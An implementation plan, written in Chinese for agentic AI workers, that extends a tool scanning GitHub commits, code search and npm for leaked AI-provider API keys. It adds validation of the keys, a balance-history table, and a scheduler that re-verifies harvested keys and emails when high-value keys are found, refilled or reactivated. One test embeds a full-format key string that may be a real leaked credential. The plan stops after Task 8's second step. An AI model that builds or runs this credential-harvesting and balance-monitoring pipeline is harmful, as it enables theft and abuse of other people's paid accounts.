# 新鲜度优先优化 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 在 GitHub token 配额不变的前提下,通过持续重验感知余额变化 + 新鲜度优先扫描(启用 CommitsScanner、扩大查询空间)提升产出。

**Architecture:** 三个独立改动面:(1) 验证端新增 ReverifyScheduler 独立线程 + store 余额历史表 + 变化检测/通知;(2) 扫描端启用已有 CommitsScanner 并加时间窗口/多平台模式,扩大 GeneratedPool 试水批;(3) 配置/CLI 新增重验参数。每面独立可测,不改变现有扫描配额。

**Tech Stack:** Python 3.10+, sqlite3, threading, requests, pytest(295+ 现有测试)。

## Global Constraints

- 基线: `25c1a41`(spec 已提交,当前工作区应干净)
- 规格: `docs/superpowers/specs/2026-08-11-freshness-focus-optimization-design.md`
- 不改 GitHub token 配额逻辑(pacing 7.5s baseline 保持)
- 新配置默认值:`reverify_budget_per_day=1500`、`hv_email_threshold=5`、`hv_top_threshold=10`、`shrink_warn_pct=30`
- 邮件仍沿用现有 email_notifier(去重窗口已具备)
- 余额历史表只记有效 key 验证;瞬态错误(error/rate_limited)不判变化
- 每任务结束跑 `python -m pytest tests/ -q` 全量回归

---

### Task 1: store.py 余额历史表

**Files:**
- Modify: `store.py`(追加函数,不动 `_SCHEMA` 已有建表——key_history 表用 `CREATE TABLE IF NOT EXISTS` 在 connect 中建)
- Test: `tests/test_store_history.py`(新建)

**Interfaces:**
- Produces: `store.record_history(conn, result: dict) -> None` — 写一行历史;`store.get_last_history(conn, key_hash: str) -> dict | None` — 返回 `{verified_at, balance_cny, status, valid}` 或 None

- [ ] **Step 1: 写失败测试**

```python
# tests/test_store_history.py
"""store.key_history 余额历史表测试。"""
import os
import tempfile

import store


def _conn():
    return store.connect(os.path.join(tempfile.mkdtemp(), "test.db"))


def _result(key, balance, valid=True, status="valid_active"):
    return {"key": key, "valid": valid, "status": status,
            "balance_cny": balance, "provider": "deepseek"}


def test_record_and_get_history():
    conn = _conn()
    store.record_history(conn, _result("sk-aaa", 5.0))
    store.record_history(conn, _result("sk-aaa", 3.0))
    last = store.get_last_history(conn, store.hash_key("sk-aaa"))
    assert last is not None
    assert last["balance_cny"] == 3.0
    assert last["valid"] == 1
    # 多条 → 取最新
    row = conn.execute(
        "SELECT COUNT(*) FROM key_history WHERE key_hash=?", (store.hash_key("sk-aaa"),)).fetchone()
    assert row[0] == 2


def test_get_last_history_missing():
    conn = _conn()
    assert store.get_last_history(conn, store.hash_key("sk-nope")) is None
```

- [ ] **Step 2: 跑测试确认失败**

Run: `python -m pytest tests/test_store_history.py -v`
Expected: FAIL(`store.record_history` 不存在)

- [ ] **Step 3: 实现**

在 `store.py` 的 `connect()` 中把 `_SCHEMA` 追加 key_history 建表:

```python
_SCHEMA = """
CREATE TABLE IF NOT EXISTS keys (
    ...
);
CREATE INDEX IF NOT EXISTS idx_keys_balance ON keys(balance DESC);
CREATE INDEX IF NOT EXISTS idx_keys_valid ON keys(valid);
CREATE TABLE IF NOT EXISTS key_history (
    key_hash    TEXT,
    verified_at TEXT,
    balance_cny REAL,
    status      TEXT,
    valid       INTEGER
);
CREATE INDEX IF NOT EXISTS idx_key_history_hash ON key_history(key_hash, verified_at);
"""
```

文件末尾追加:

```python
def record_history(conn, result: dict) -> None:
    """写一条余额历史(仅有效 key;无效不写,省空间)。"""
    if not result.get("valid"):
        return
    key = result.get("key") or ""
    if not key:
        return
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    conn.execute(
        "INSERT INTO key_history (key_hash, verified_at, balance_cny, status, valid) VALUES (?,?,?,?,?)",
        (hash_key(key), now, float(result.get("balance_cny") or 0),
         result.get("status", ""), 1),
    )
    conn.commit()


def get_last_history(conn, key_hash: str) -> dict | None:
    """该 key 最近一条验证历史;无则 None。"""
    row = conn.execute(
        "SELECT verified_at, balance_cny, status, valid FROM key_history "
        "WHERE key_hash=? ORDER BY verified_at DESC LIMIT 1", (key_hash,)).fetchone()
    if row is None:
        return None
    return {"verified_at": row["verified_at"], "balance_cny": row["balance_cny"],
            "status": row["status"], "valid": row["valid"]}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `python -m pytest tests/test_store_history.py -v`
Expected: PASS(2 passed)

- [ ] **Step 5: 提交**

```bash
git add store.py tests/test_store_history.py
git commit -m "feat: store key_history 余额历史表 (record/get_last_history)"
```

---

### Task 2: 配置 + CLI 重验参数

**Files:**
- Modify: `config_loader.py`(watch 段 4 个新配置)
- Modify: `run.py`(watch 子命令 4 个新 flag,默认取 config)
- Modify: `config.ini.example`(示例)
- Test: `tests/test_config_loader.py`(追加 1 个测试)

**Interfaces:**
- Produces: `config.watch_reverify_budget`(int, 1500)、`config.watch_hv_email_threshold`(float, 5.0)、`config.watch_hv_top_threshold`(float, 10.0)、`config.watch_shrink_warn_pct`(float, 30.0);`cmd_watch` 透传同名 kwargs

- [ ] **Step 1: 写失败测试**

在 `tests/test_config_loader.py` 追加:

```python
def test_watch_reverify_config_defaults():
    from config_loader import ConfigLoader
    cfg = ConfigLoader()
    assert cfg.watch_reverify_budget == 1500
    assert cfg.watch_hv_email_threshold == 5.0
    assert cfg.watch_hv_top_threshold == 10.0
    assert cfg.watch_shrink_warn_pct == 30.0
```

- [ ] **Step 2: 跑测试确认失败**

Run: `python -m pytest tests/test_config_loader.py::test_watch_reverify_config_defaults -v`
Expected: FAIL(AttributeError)

- [ ] **Step 3: 实现**

`config_loader.py` `__init__` 的 watch 段追加:

```python
self._watch_reverify_budget: int = 1500
self._watch_hv_email_threshold: float = 5.0
self._watch_hv_top_threshold: float = 10.0
self._watch_shrink_warn_pct: float = 30.0
```

`_load()` 的 watch 段追加:

```python
self._watch_reverify_budget = self._getint("watch", "reverify_budget_per_day", 1500)
self._watch_hv_email_threshold = self._getfloat("watch", "hv_email_threshold", 5.0)
self._watch_hv_top_threshold = self._getfloat("watch", "hv_top_threshold", 10.0)
self._watch_shrink_warn_pct = self._getfloat("watch", "shrink_warn_pct", 30.0)
```

property 区追加(照抄现有 `watch_verify_workers` 模式):

```python
@property
def watch_reverify_budget(self) -> int:
    return self._watch_reverify_budget

@property
def watch_hv_email_threshold(self) -> float:
    return self._watch_hv_email_threshold

@property
def watch_hv_top_threshold(self) -> float:
    return self._watch_hv_top_threshold

@property
def watch_shrink_warn_pct(self) -> float:
    return self._watch_shrink_warn_pct
```

`run.py` watch 子命令追加(在 `--verify-workers` 后):

```python
p_watch.add_argument("--reverify-budget", type=int, default=_cfg.watch_reverify_budget,
                     help="每日重验预算 (默认 1500)")
p_watch.add_argument("--hv-email-threshold", type=float, default=_cfg.watch_hv_email_threshold,
                     help="高价值邮件阈值 CNY (默认 5)")
p_watch.add_argument("--hv-top-threshold", type=float, default=_cfg.watch_hv_top_threshold,
                     help="重高价值阈值 CNY (默认 10)")
p_watch.add_argument("--shrink-warn-pct", type=float, default=_cfg.watch_shrink_warn_pct,
                     help="缩水预警百分比 (默认 30)")
```

`cmd_watch` 的 `run_watch(...)` 调用追加透传:

```python
reverify_budget=args.reverify_budget,
hv_email_threshold=args.hv_email_threshold,
hv_top_threshold=args.hv_top_threshold,
shrink_warn_pct=args.shrink_warn_pct,
```

`config.ini.example` 的 `[watch]` 段追加:

```ini
# 每日重验预算（历史有效 key 轮询重验，默认 1500）
reverify_budget_per_day = 1500
# 高价值邮件阈值 CNY（默认 5）
hv_email_threshold = 5
# 重高价值阈值 CNY（默认 10）
hv_top_threshold = 10
# 缩水预警百分比（默认 30，余额跌幅超此值触发预警）
shrink_warn_pct = 30
```

- [ ] **Step 4: 跑测试确认通过**

Run: `python -m pytest tests/test_config_loader.py -v`
Expected: PASS

- [ ] **Step 5: 提交**

```bash
git add config_loader.py run.py config.ini.example tests/test_config_loader.py
git commit -m "feat: watch 重验参数 (budget/阈值/缩水预警) + CLI flag"
```

---

### Task 3: VerificationBroker.enqueue_reverify + 在途追踪

**Files:**
- Modify: `watch_tui.py`(VerificationBroker: 新增 `_in_flight` 集合、`enqueue_reverify()`、`_store_result` 更新在途)
- Test: `tests/test_watch_tui.py`(追加,文件已存在)

**Interfaces:**
- Consumes: Task 1 的 `store.record_history`(在 `_store_result` 调)
- Produces: `VerificationBroker.enqueue_reverify(key, source, repos) -> bool` — 持续重验专用,绕过 `_reverify_queued`,每 key 同一时刻只在途一次;`VerificationBroker.get_valid_keys(batch: int = 200) -> list[dict]` — 从 store 取 valid=1 全量 key(带 balance),供调度器用

- [ ] **Step 1: 写失败测试**

在 `tests/test_watch_tui.py` 追加:

```python
def test_enqueue_reverify_bypasses_queued():
    """持续重验不受 _reverify_queued 单次限制;在途 key 不重复入队。"""
    import queue
    from watch_tui import VerificationBroker

    broker = VerificationBroker.__new__(VerificationBroker)
    broker._queue = queue.PriorityQueue()
    broker._counter = 0
    broker._seen = set()
    broker._seen_lock = __import__("threading").Lock()
    broker._reverify_queued = {"sk-old"}
    broker._reverify_max = 100_000
    broker._stop = False
    broker._in_flight = set()
    broker._in_flight_lock = __import__("threading").Lock()

    assert broker.enqueue_reverify("sk-new", source="history") is True
    assert broker.enqueue_reverify("sk-new", source="history") is False  # 在途
    # 不受 _reverify_queued 限制
    assert broker.enqueue_reverify("sk-other", source="history") is True
    assert broker._queue.qsize() == 2
```

- [ ] **Step 2: 跑测试确认失败**

Run: `python -m pytest tests/test_watch_tui.py::test_enqueue_reverify_bypasses_queued -v`
Expected: FAIL(AttributeError)

- [ ] **Step 3: 实现**

在 `VerificationBroker.__init__` 追加(与 `_reverify_queued` 同区):

```python
# 持续重验在途追踪:已排入队列但验证未完成的 key 集合
self._in_flight: set[str] = set()
self._in_flight_lock = threading.Lock()
```

新增方法(放在 `reverify()` 后):

```python
def enqueue_reverify(self, key: str, source: str = "history",
                     repos: list[dict] | None = None) -> bool:
    """持续重验专用入队:绕过 _reverify_queued 单次限制,每 key 同一时刻只在途一次。

    与 reverify()(启动重验,每会话一次)分离:调度器每轮重排,不受启动批次约束。
    """
    if not key or self._stop:
        return False
    with self._in_flight_lock:
        if key in self._in_flight:
            return False
        self._in_flight.add(key)
        self._counter += 1
        counter = self._counter
    self._queue.put((20, counter, {
        "key": key, "source": source, "repos": repos or [],
        "key_preview": key[:10] + "..." + key[-4:], "reverify_src": True,
    }))
    return True
```

新增方法(调度器取候选用):

```python
def get_valid_keys(self, batch: int = 200) -> list[dict]:
    """从 store 取 valid=1 的 key(带余额),按余额降序。无 store 时返回空。"""
    if self._store_conn is None:
        return []
    try:
        rows = self._store_conn.execute(
            "SELECT key, balance FROM keys WHERE valid = 1 ORDER BY balance DESC"
        ).fetchall()
    except Exception:
        return []
    return [{"key": r["key"], "balance_cny": float(r["balance"] or 0)} for r in rows[:batch]]
```

在 `_store_result` 末尾(持久化之后)追加:

```python
# 持续重验在途释放 + 余额历史(仅有效)
if key in self._in_flight:
    with self._in_flight_lock:
        self._in_flight.discard(key)
if self._store_conn is not None and result.get("valid"):
    try:
        import store as _store
        _store.record_history(self._store_conn, result)
    except Exception:
        pass
```

(注意: `_store_result` 里 `key in self._in_flight` 判定要在加锁后 discard,避免竞态)

- [ ] **Step 4: 跑测试确认通过**

Run: `python -m pytest tests/test_watch_tui.py::test_enqueue_reverify_bypasses_queued -v`
Expected: PASS

- [ ] **Step 5: 提交**

```bash
git add watch_tui.py tests/test_watch_tui.py
git commit -m "feat: broker enqueue_reverify 持续重验通道 + 在途追踪 + 余额历史写入"
```

---

### Task 4: 变化检测 + balance_changes.csv

**Files:**
- Modify: `watch_tui.py`(新增模块级 `detect_balance_change()` + `log_balance_change()`)
- Test: `tests/test_watch_tui.py`(追加)

**Interfaces:**
- Consumes: Task 1 的 `store.get_last_history`
- Produces: `detect_balance_change(prev: dict | None, cur: dict, email_threshold: float, top_threshold: float, shrink_pct: float) -> tuple[str | None, bool]` — 返回 `(change_type, notify_email)`,change_type ∈ {`shrink`, `refill`, `reactivated`, `other`, None};`log_balance_change(csv_path, result, prev, change_type)` — 追加 CSV 行

- [ ] **Step 1: 写失败测试**

```python
def test_detect_balance_change():
    from watch_tui import detect_balance_change

    # 缩水: >30% 且当前 >= 重高价值阈值
    prev = {"balance_cny": 50.0, "valid": 1}
    cur = {"balance_cny": 30.0, "valid": True, "key": "sk-x"}
    assert detect_balance_change(prev, cur, 5.0, 10.0, 30.0) == ("shrink", True)
    # 缩水但未达重高价值 → 不邮件
    prev2 = {"balance_cny": 8.0, "valid": 1}
    cur2 = {"balance_cny": 5.0, "valid": True, "key": "sk-y"}
    assert detect_balance_change(prev2, cur2, 5.0, 10.0, 30.0)[1] is False
    # 充值: 涨 >50% 且 >= 邮件阈值
    prev3 = {"balance_cny": 2.0, "valid": 1}
    cur3 = {"balance_cny": 8.0, "valid": True, "key": "sk-z"}
    assert detect_balance_change(prev3, cur3, 5.0, 10.0, 30.0) == ("refill", True)
    # 重新激活: 上次无效 → 现在有效
    prev4 = {"balance_cny": 0.0, "valid": 0}
    cur4 = {"balance_cny": 6.0, "valid": True, "key": "sk-w"}
    assert detect_balance_change(prev4, cur4, 5.0, 10.0, 30.0) == ("reactivated", True)
    # 微小变化 → other, 不邮件
    prev5 = {"balance_cny": 7.0, "valid": 1}
    cur5 = {"balance_cny": 7.5, "valid": True, "key": "sk-v"}
    assert detect_balance_change(prev5, cur5, 5.0, 10.0, 30.0) == ("other", False)
    # 无历史 → None
    assert detect_balance_change(None, cur, 5.0, 10.0, 30.0) == (None, False)


def test_log_balance_change(tmp_path):
    import csv
    from watch_tui import log_balance_change
    p = tmp_path / "changes.csv"
    log_balance_change(str(p), {"key": "sk-a", "balance_cny": 8.0, "status": "valid_active"},
                       {"balance_cny": 5.0}, "refill")
    with open(p, newline="", encoding="utf-8") as f:
        rows = list(csv.DictReader(f))
    assert len(rows) == 1
    assert rows[0]["change_type"] == "refill"
    assert rows[0]["balance_cny"] == "8.0"
    assert rows[0]["prev_balance"] == "5.0"
```

- [ ] **Step 2: 跑测试确认失败**

Run: `python -m pytest tests/test_watch_tui.py -k "detect_balance_change or log_balance_change" -v`
Expected: FAIL(ImportError)

- [ ] **Step 3: 实现**

在 `watch_tui.py` 顶部(`filter_high_value` 附近)追加:

```python
def detect_balance_change(prev: dict | None, cur: dict,
                          email_threshold: float = 5.0,
                          top_threshold: float = 10.0,
                          shrink_pct: float = 30.0) -> tuple[str | None, bool]:
    """比较上次与本次验证结果,判定余额变化类型。

    返回 (change_type, notify_email):
    - shrink: 缩水>shrink_pct% 且当前余额>=top_threshold → 邮件
    - refill: 涨>50% 且当前>=email_threshold → 邮件
    - reactivated: 上次无效→有效 且 当前>=email_threshold → 邮件
    - other: 有变化但未达阈值 → 不邮件
    - None: 无历史 → 不邮件
    """
    if prev is None:
        return None, False
    cur_b = float(cur.get("balance_cny") or 0)
    prev_b = float(prev.get("balance_cny") or 0)
    prev_valid = bool(prev.get("valid"))

    if not prev_valid and cur.get("valid"):
        return ("reactivated", cur_b >= email_threshold)
    if prev_valid and cur_b < prev_b * (1 - shrink_pct / 100.0):
        return ("shrink", cur_b >= top_threshold)
    if prev_valid and cur_b > prev_b * 1.5:
        return ("refill", cur_b >= email_threshold)
    if prev_valid and cur_b != prev_b:
        return ("other", False)
    return (None, False)


def log_balance_change(csv_path: str, cur: dict, prev: dict | None,
                       change_type: str | None) -> None:
    """追加一条余额变化记录到 CSV(首次写表头)。"""
    if change_type is None:
        return
    import csv as _csv
    from datetime import datetime as _dt
    new = not os.path.exists(csv_path)
    with open(csv_path, "a", newline="", encoding="utf-8") as f:
        w = _csv.writer(f)
        if new:
            w.writerow(["ts", "key", "balance_cny", "prev_balance", "delta", "change_type"])
        cur_b = float(cur.get("balance_cny") or 0)
        prev_b = float(prev.get("balance_cny") or 0) if prev else 0.0
        w.writerow([_dt.now().strftime("%Y-%m-%d %H:%M:%S"), cur.get("key", ""),
                    f"{cur_b:.4f}", f"{prev_b:.4f}", f"{cur_b - prev_b:+.4f}",
                    change_type])
```

(需确认 `watch_tui.py` 已 import os;若没有,在文件顶部补 `import os`)

- [ ] **Step 4: 跑测试确认通过**

Run: `python -m pytest tests/test_watch_tui.py -k "detect_balance_change or log_balance_change" -v`
Expected: PASS

- [ ] **Step 5: 提交**

```bash
git add watch_tui.py tests/test_watch_tui.py
git commit -m "feat: 余额变化检测 (shrink/refill/reactivated) + balance_changes.csv"
```

---

### Task 5: ReverifyScheduler 线程 + run_watch 接线

**Files:**
- Modify: `watch_tui.py`(新增 `ReverifyScheduler` 类;`run_watch` 签名加 4 参数 + 启动调度器)
- Modify: `config_loader.py` 已由 Task 2 完成
- Test: `tests/test_reverify_scheduler.py`(新建)

**Interfaces:**
- Consumes: Task 3 `broker.enqueue_reverify()` / `broker.get_valid_keys()`;Task 4 `detect_balance_change()` / `log_balance_change()`
- Produces: `ReverifyScheduler(broker, store_conn, budget_per_day=1500, email_threshold=5.0, top_threshold=10.0, shrink_pct=30.0, changes_csv="results/balance_changes.csv")` 方法 `start()` / `stop()`;`run_watch` 新增 kwargs `reverify_budget`, `hv_email_threshold`, `hv_top_threshold`, `shrink_warn_pct`

- [ ] **Step 1: 写失败测试**

```python
# tests/test_reverify_scheduler.py
"""ReverifyScheduler 持续重验调度测试。"""
import os
import tempfile
import threading
import time

import store
from watch_tui import ReverifyScheduler


def _make_scheduler(**kw):
    conn = store.connect(os.path.join(tempfile.mkdtemp(), "test.db"))
    conn.execute("INSERT INTO keys (key_hash, key, key_preview, provider, source, repo, file, url, valid, balance, currency, status, first_seen, last_seen) "
                 "VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                 (store.hash_key("sk-top"), "sk-top", "sk-top", "deepseek", "github_search", "", "", "",
                  1, 50.0, "CNY", "valid_active", "2026-08-01 00:00:00", "2026-08-01 00:00:00"))
    conn.execute("INSERT INTO keys (key_hash, key, key_preview, provider, source, repo, file, url, valid, balance, currency, status, first_seen, last_seen) "
                 "VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                 (store.hash_key("sk-low"), "sk-low", "sk-low", "deepseek", "github_search", "", "", "",
                  1, 0.5, "CNY", "valid_active", "2026-08-01 00:00:00", "2026-08-01 00:00:00"))
    conn.commit()

    class FakeBroker:
        def __init__(self):
            self.enqueued = []

        def enqueue_reverify(self, key, source="history", repos=None):
            self.enqueued.append(key)
            return True

        def get_valid_keys(self, batch=200):
            rows = conn.execute("SELECT key, balance FROM keys WHERE valid=1 ORDER BY balance DESC").fetchall()
            return [{"key": r["key"], "balance_cny": float(r["balance"])} for r in rows[:batch]]

    broker = FakeBroker()
    s = ReverifyScheduler(broker, conn, budget_per_day=kw.get("budget", 100000),
                          email_threshold=5.0, top_threshold=10.0, shrink_pct=30.0)
    return s, broker, conn


def test_tick_high_value_priority():
    s, broker, conn = _make_scheduler(budget=100000)
    s._tick()  # 首轮:预算充足 → 全量候选入队
    assert "sk-top" in broker.enqueued
    assert "sk-low" in broker.enqueued


def test_tick_respects_budget():
    s, broker, conn = _make_scheduler(budget=1)  # 1 次/天
    s._tick()
    assert len(broker.enqueued) == 1
    assert broker.enqueued[0] == "sk-top"  # 高价值优先


def test_tick_tier_intervals():
    s, broker, conn = _make_scheduler(budget=100000)
    conn.execute("UPDATE keys SET last_seen=datetime('now','-1 hour') WHERE key='sk-top'")
    conn.commit()
    s._tick()  # top(>=10元) 每 6h → last_seen 1h 前 → 跳过
    assert "sk-top" not in broker.enqueued
    assert "sk-low" in broker.enqueued  # 低价值按预算轮询
```

- [ ] **Step 2: 跑测试确认失败**

Run: `python -m pytest tests/test_reverify_scheduler.py -v`
Expected: FAIL(ImportError)

- [ ] **Step 3: 实现**

在 `watch_tui.py` 追加(放在 VerificationBroker 之后、WatchState 之前):

```python
class ReverifyScheduler:
    """持续重验调度器:独立线程,按预算令牌桶 + 分层间隔轮询历史有效 key。

    分层: >=top_threshold 每 6h / >=email_threshold 每 12h / 其余按预算均摊。
    入队走 broker.enqueue_reverify(绕过 _reverify_queued,在途不重复)。
    """

    def __init__(self, broker, store_conn, budget_per_day: int = 1500,
                 email_threshold: float = 5.0, top_threshold: float = 10.0,
                 shrink_pct: float = 30.0,
                 changes_csv: str = os.path.join("results", "balance_changes.csv")):
        self.broker = broker
        self._conn = store_conn
        self._budget_per_day = max(1, budget_per_day)
        self._email_threshold = email_threshold
        self._top_threshold = top_threshold
        self._shrink_pct = shrink_pct
        self._changes_csv = changes_csv
        self._tokens = self._budget_per_day  # 令牌桶,每天重置
        self._last_reset_day = datetime.now().strftime("%Y-%m-%d")
        self._last_verified: dict[str, float] = {}  # key -> 上次重验 timestamp
        self._stop = False
        self._thread = None

    # 分层间隔(秒)
    _TIER_INTERVAL_TOP = 6 * 3600      # >= top_threshold
    _TIER_INTERVAL_HV = 12 * 3600      # >= email_threshold
    _TIER_INTERVAL_OTHER = 7 * 24 * 3600 / 1500.0  # 其余按预算均摊(~403s)

    def _tier_interval(self, balance: float) -> float:
        if balance >= self._top_threshold:
            return self._TIER_INTERVAL_TOP
        if balance >= self._email_threshold:
            return self._TIER_INTERVAL_HV
        return self._TIER_INTERVAL_OTHER

    def _reset_tokens_if_new_day(self):
        today = datetime.now().strftime("%Y-%m-%d")
        if today != self._last_reset_day:
            self._tokens = self._budget_per_day
            self._last_reset_day = today

    def _tick(self) -> int:
        """一轮调度:选候选 key 入队,返回入队数。"""
        self._reset_tokens_if_new_day()
        if self._conn is None or self._tokens <= 0:
            return 0
        now = time.time()
        candidates = self.broker.get_valid_keys(batch=500)
        enqueued = 0
        for c in candidates:
            if self._tokens <= 0:
                break
            key = c.get("key", "")
            if not key:
                continue
            last = self._last_verified.get(key, 0.0)
            interval = self._tier_interval(c.get("balance_cny", 0))
            if now - last < interval:
                continue
            import store as _store
            try:
                kh = _store.hash_key(key)
                prev = _store.get_last_history(self._conn, kh)
            except Exception:
                prev = None
            if self.broker.enqueue_reverify(key, source="history"):
                self._last_verified[key] = now
                self._tokens -= 1
                enqueued += 1
                # 变化检测在 _store_result 之外做? 不——结果回调由 broker 处理,
                # 调度器只负责排期;变化检测/通知在 broker 的 store_result 链路里。
        return enqueued

    def start(self):
        if self._thread is not None and self._thread.is_alive():
            return
        self._stop = False

        def _loop():
            while not self._stop:
                try:
                    self._tick()
                except Exception:
                    pass
                time.sleep(60)

        self._thread = threading.Thread(target=_loop, daemon=True, name="reverify-scheduler")
        self._thread.start()

    def stop(self):
        self._stop = True
```

`run_watch` 签名追加 4 参数(默认 None → 从 config 读):

```python
    reverify_budget: int | None = None,
    hv_email_threshold: float | None = None,
    hv_top_threshold: float | None = None,
    shrink_warn_pct: float | None = None,
```

在 `run_watch` 里 `broker = VerificationBroker(...)` 之后、`scanner.run()` 之前启动调度器:

```python
    # 持续重验调度器:按预算轮询历史有效 key,感知余额变化(缩水/充值/重新激活)
    try:
        from config_loader import config as _cfg
        rv_budget = reverify_budget if reverify_budget is not None else _cfg.watch_reverify_budget
        rv_email = hv_email_threshold if hv_email_threshold is not None else _cfg.watch_hv_email_threshold
        rv_top = hv_top_threshold if hv_top_threshold is not None else _cfg.watch_hv_top_threshold
        rv_shrink = shrink_warn_pct if shrink_warn_pct is not None else _cfg.watch_shrink_warn_pct
        rv_scheduler = ReverifyScheduler(
            broker, broker._store_conn,
            budget_per_day=rv_budget, email_threshold=rv_email,
            top_threshold=rv_top, shrink_pct=rv_shrink,
        )
        rv_scheduler.start()
        state.add_log(
            f"持续重验调度器已启动: 预算 {rv_budget}/天, 高价值≥¥{rv_email}, "
            f"重高价值≥¥{rv_top}, 缩水预警 {rv_shrink}%", "info")
    except Exception as e:
        state.add_log(f"持续重验调度器启动失败: {e}", "warning")
```

在 `run_watch` 结束处(Ctrl+C 清理区)追加 `rv_scheduler.stop()`(若已启动):

```python
    try:
        rv_scheduler.stop()
    except Exception:
        pass
```

- [ ] **Step 4: 跑测试确认通过**

Run: `python -m pytest tests/test_reverify_scheduler.py -v`
Expected: PASS(3 passed)

- [ ] **Step 5: 提交**

```bash
git add watch_tui.py tests/test_reverify_scheduler.py
git commit -m "feat: ReverifyScheduler 持续重验线程 (分层间隔+预算令牌桶) + run_watch 接线"
```

---

### Task 6: 启用 CommitsScanner(watch 默认源)

**Files:**
- Modify: `watch_tui.py`(DEFAULT_WATCH_SOURCES 加 `"github_commits"`)
- Test: `tests/test_watch_tui.py`(追加)

**Interfaces:**
- Consumes: 已有 `scanners/github_commits.CommitsScanner`
- Produces: watch 默认源列表包含 `github_commits`

- [ ] **Step 1: 写失败测试**

```python
def test_default_watch_sources_includes_commits():
    from watch_tui import DEFAULT_WATCH_SOURCES
    assert "github_commits" in DEFAULT_WATCH_SOURCES
```

- [ ] **Step 2: 跑测试确认失败**

Run: `python -m pytest tests/test_watch_tui.py::test_default_watch_sources_includes_commits -v`
Expected: FAIL

- [ ] **Step 3: 实现**

```python
DEFAULT_WATCH_SOURCES = [
    "github_search",
    "github_commits",   # 最近提交 diff 里的 key(新鲜度最高,配额独立于 code search)
    "npm",
]
```

**同时必须修 registry 别名**:`_source_worker` 用源名 `github_commits` 调 `_scan_external("github_commits")` → `_run_one_scanner("github_commits")` → `registry.get("github_commits")` 当前会 miss(registry 里 key 是 `"commits"`)。在 `scanner_engine.py` `_get_scanner_registry` 返回 dict 加别名:

```python
return {
    ...
    "commits": (CommitsScanner, None, {"token": github_token, "proxy": self.proxy}),
    "github_commits": (CommitsScanner, None, {"token": github_token, "proxy": self.proxy}),  # 别名(watch 源名)
    ...
}
```

(若 `_scan_external` 的 registry 查不到会走 `(None, None, {})` → `scanner_cls is None` → 直接 return,源静默零产出。加别名后走通。)

- [ ] **Step 4: 跑测试确认通过**

Run: `python -m pytest tests/test_watch_tui.py::test_default_watch_sources_includes_commits -v`
Expected: PASS

- [ ] **Step 5: 提交**

```bash
git add watch_tui.py tests/test_watch_tui.py
git commit -m "feat: watch 默认源启用 github_commits (最近提交 diff 扫描)"
```

---

### Task 7: CommitsScanner 升级 — since 时间窗口 + 多平台 key 模式

**Files:**
- Modify: `scanners/github_commits.py`(加 `since_hours`、多平台 key 模式)
- Test: `tests/test_github_commits.py`(新建)

**Interfaces:**
- Consumes: `scanners/base.extract_keys`
- Produces: `CommitsScanner(token="", max_repos=100, since_hours=0, **kwargs)` — `since_hours>0` 时 commits API 带 `since` 参数;KEY_PATTERN 覆盖多平台前缀(`sk-ant-`/`sk-kimi-`/`sk-sp-`/`sk-proj-`)

- [ ] **Step 1: 写失败测试**

```python
# tests/test_github_commits.py
"""CommitsScanner 升级测试: since 窗口 + 多平台 key。"""
from scanners.github_commits import CommitsScanner


def test_key_pattern_multiplatform():
    pat = CommitsScanner.KEY_PATTERN
    assert pat.search("sk-ant-api03-abcdefghijklmnopqrstuvwxyz123456789") is not None
    assert pat.search("sk-kimi-abcdefghijklmnopqrstuvwxyz123456") is not None
    assert pat.search("sk-sp-abcdefghijklmnopqrstuvwxyz123456") is not None
    assert pat.search("sk-proj-abcdefghijklmnopqrstuvwxyz") is not None
    assert pat.search("sk-4677b153277a40b0" "96c6716686c29ac4") is not None  # 纯 sk-
    assert pat.search("ghp_abcdefghijklmnopqrstuvwxyz") is None  # 非 sk- 不应误报


def test_since_param_build():
    s = CommitsScanner(token="t", since_hours=2)
    assert s.since_hours == 2
```

- [ ] **Step 2: 跑测试确认失败**

Run: `python -m pytest tests/test_github_commits.py -v`
Expected: FAIL(sk-ant- 不匹配)

- [ ] **Step 3: 实现**

`github_commits.py` 修改:

```python
KEY_PATTERN = re.compile(
    r"(?:sk-(?:ant-[a-zA-Z0-9_-]{24,}|kimi-[a-zA-Z0-9_-]{24,}|"
    r"sp-[a-zA-Z0-9_-]{24,}|proj-[a-zA-Z0-9_-]{24,}|or-v1-[a-zA-Z0-9_-]{24,}|"
    r"[a-zA-Z0-9]{32,64}))"
)

def __init__(self, token: str = "", max_repos: int = 100, since_hours: int = 0, **kwargs):
    ...
    self.since_hours = since_hours
```

`_scan_repo_commits` 的 commits URL 加 since:

```python
url = f"{self.BASE}/repos/{repo}/commits?per_page=30"
if self.since_hours > 0:
    import datetime as _dt
    since = _dt.datetime.now(_dt.timezone.utc) - _dt.timedelta(hours=self.since_hours)
    url += f"&since={since.isoformat()}"
```

- [ ] **Step 4: 跑测试确认通过**

Run: `python -m pytest tests/test_github_commits.py -v`
Expected: PASS

- [ ] **Step 5: 提交**

```bash
git add scanners/github_commits.py tests/test_github_commits.py
git commit -m "feat: CommitsScanner since 时间窗口 + 多平台 key 模式"
```

---

### Task 8: 查询空间扩展 — GeneratedPool 试水批 + 外部源多词

**Files:**
- Modify: `watch_tui.py`(GeneratedPool 试水批 12 → 24;外部源默认词扩展)
- Modify: `query_rotation.py`(`GeneratedPool.next_batch` 支持 size 参数)
- Test: `tests/test_generated_pool.py`(追加)

**Interfaces:**
- Consumes: `GeneratedPool(filepath, batch_size)`;`query_stats.json` 收益数据
- Produces: `GeneratedPool.next_batch(size: int | None = None) -> list[str]`

- [ ] **Step 1: 写失败测试**

```python
def test_next_batch_size_param():
    from query_rotation import GeneratedPool
    import tempfile, os
    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False, encoding="utf-8") as f:
        f.write("\n".join(f"q{i}" for i in range(30)))
        path = f.name
    try:
        pool = GeneratedPool(path, batch_size=12)
        b1 = pool.next_batch(size=24)
        assert len(b1) == 24
        b2 = pool.next_batch(size=24)
        assert len(b2) == 6  # 剩余不足 24
        assert not pool.next_batch(size=24)  # 池耗尽,自动重置
    finally:
        os.unlink(path)
```

- [ ] **Step 2: 跑测试确认失败**

Run: `python -m pytest tests/test_generated_pool.py::test_next_batch_size_param -v`
